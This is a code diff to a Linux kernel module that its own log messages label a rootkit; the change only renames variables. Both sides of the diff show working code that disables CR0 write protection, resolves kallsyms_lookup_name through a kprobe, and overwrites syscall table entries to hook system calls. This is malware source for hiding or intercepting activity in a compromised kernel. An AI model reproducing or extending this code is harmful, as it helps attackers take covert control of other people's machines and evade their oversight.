@@ -14,11 +14,11 @@ static sysfun_t *p_syscall_table = NULL; // Pointer to the syscall table.
 /**
  * Writes the given value to the CR0 register.
  *
- * @param val The value to write
+ * @param ui64_val The value to write
  */
-static inline void cr0_write(unsigned long val)
+static inline void cr0_write(unsigned long ui64_val)
 {
-    asm volatile("mov %0,%%cr0" : "+r"(val) : : "memory");
+    asm volatile("mov %0,%%cr0" : "+r"(ui64_val) : : "memory");
 }
 
 /**
@@ -28,28 +28,28 @@ static inline void cr0_write(unsigned long val)
  */
 static inline unsigned long unprotect_memory(void)
 {
-    unsigned long ul_orig_cr0 = 0;
-    unsigned long ul_new_cr0  = 0;
+    unsigned long ui64_orig_cr0 = 0;
+    unsigned long ui64_new_cr0  = 0;
 
-    ul_orig_cr0 = native_read_cr0();           // in special_insns.h
-    ul_new_cr0  = ul_orig_cr0 & ~(X86_CR0_WP); // in processor-flags.h
-    cr0_write(ul_new_cr0);
-    return ul_orig_cr0;
+    ui64_orig_cr0 = native_read_cr0();             // in special_insns.h
+    ui64_new_cr0  = ui64_orig_cr0 & ~(X86_CR0_WP); // in processor-flags.h
+    cr0_write(ui64_new_cr0);
+    return ui64_orig_cr0;
 }
 
 /**
  * Restores the original value of the CR0 register.
  *
- * @param ul_orig_cr0 The original value of the CR0 register
+ * @param ui64_orig_cr0 The original value of the CR0 register
  */
-static inline void protect_memory(const unsigned long ul_orig_cr0)
+static inline void protect_memory(const unsigned long ui64_orig_cr0)
 {
-    cr0_write(ul_orig_cr0);
+    cr0_write(ui64_orig_cr0);
 }
 
 int __init init_hooking(void)
 {
-    int i_err = 0;
+    int i32_err = 0;
 
     // Declare what we need to find
     struct kprobe probe = {
@@ -61,10 +61,10 @@ int __init init_hooking(void)
         return -EALREADY;
     }
 
-    i_err = register_kprobe(&probe);
-    IF_U (i_err) {
+    i32_err = register_kprobe(&probe);
+    IF_U (i32_err) {
         pr_err("[ROOTKIT] Failed to get kallsyms_lookup_name() address.\n");
-        return i_err;
+        return i32_err;
     }
 
     // Function pointer type of kallsyms_lookup_name()
@@ -93,11 +93,11 @@ sysfun_t get_syscall_entry(const size_t sz_syscall_nr)
 
 void set_syscall_entry(const size_t sz_syscall_nr, const sysfun_t new_sysfun)
 {
-    unsigned long ul_orig_cr0 = unprotect_memory();
+    unsigned long ui64_orig_cr0 = unprotect_memory();
 
     p_syscall_table[sz_syscall_nr] = new_sysfun;
 
-    protect_memory(ul_orig_cr0);
+    protect_memory(ui64_orig_cr0);
 }
 
 int hook_syscall(hook_t *const p_hook)
@@ -119,12 +119,12 @@ void unhook_syscall(const hook_t *const p_hook)
 
 int __init hook_syscalls(hook_t p_hooks[])
 {
-    int i_err = 0;
+    int i32_err = 0;
     size_t i;
 
     for (i = 0; p_hooks[i].new_sysfun != NULL; ++i) {
-        i_err = hook_syscall(&p_hooks[i]);
-        IF_U (i_err) {
+        i32_err = hook_syscall(&p_hooks[i]);
+        IF_U (i32_err) {
             pr_err("[ROOTKIT] Failed to hook syscall %zu (n. %zu)\n", p_hooks[i].sz_syscall_nr, i);
 
             // Rollback previous hooks before returning the error
@@ -133,7 +133,7 @@ int __init hook_syscalls(hook_t p_hooks[])
                 unhook_syscall(&p_hooks[i]);
             }
 
-            return i_err;
+            return i32_err;
         }
     }
 
